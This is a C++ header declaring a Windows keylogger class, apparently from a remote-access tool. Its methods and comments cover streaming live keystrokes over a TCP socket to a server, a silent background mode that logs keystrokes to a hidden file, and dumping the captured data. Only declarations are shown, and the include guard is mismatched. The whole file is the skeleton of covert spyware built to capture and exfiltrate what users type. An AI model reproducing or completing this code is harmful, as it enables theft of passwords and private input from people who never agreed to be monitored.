#ifndef KEYLOGG_H
#define KEYLOG_H

#include "master.h"

using namespace std;


class Keylogger
{
    public:

        Keylogger();
        //-----------------------------------------------
        VOID setup();
        //-----------------------------------------------
        wstring specialKey(INT &keystroke);
        wstring intToUnicode(INT keystroke);
        //-----------------------------------------------
        VOID directTcp();  //sends live keystrokes to the server.

        static DWORD WINAPI sendKeystrokeThread(LPVOID param); // start thread directSendKeystroke
        static DWORD WINAPI recvDataThread(LPVOID param); //start thread directRecvData
        
        BOOL directSendKeystrokeRunning = FALSE; //directSendKeystroke
        VOID directRecvData(); //waiting for the end of the mod keylogger 
        VOID directSendKeystroke(); //sends keystrokes 
        //-----------------------------------------------        
        static DWORD WINAPI silenciousThread(LPVOID param); //start thread keyboardListeningAndWriteFile
        BOOL silenciousBackgroundRunning = FALSE; //test if the "silentThread" is currently alive. 
        INT silenciousStart(); //return 1 if error.  | In case of error the silent mod will not work. 
        INT silenciousStop();  //return 1 if error | returns 1 if the silencious thread is not started. 
        INT silenciousCreateFileAndHideFile(); //Create a file to store the keystrokes. Then hide the file. 
        VOID silenciousKeyboardListeningAndWriteFile(CONST HANDLE &hFile); // for silenciousBackground
        VOID silenciousWriteKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFile);  //listens to the keystrokes and writes the result to the file.
        
        vector <string> dumpAllData();// Returns all the data from the file that contains the keystrokes. 

        //-----------------------------------------------
        SOCKET getSocket();
        //-----------------------------------------------
        VOID setSocket(SOCKET &sock);
        //VOID setPathProg(wstring &path);
        //-----------------------------------------------
        HANDLE gethFile();
        //-----------------------------------------------
        ~Keylogger();
        
    private:
        
        SOCKET a_sock;
        HANDLE a_hFile;
        CONST WCHAR a_file_name[8] = L"log.txt";
        HWND a_WindowHandle;
        DWORD a_dwThreadId;
        HKL a_hkl;
     
};
//DWORD WINAPI directTcp(LPVOID param)
#endif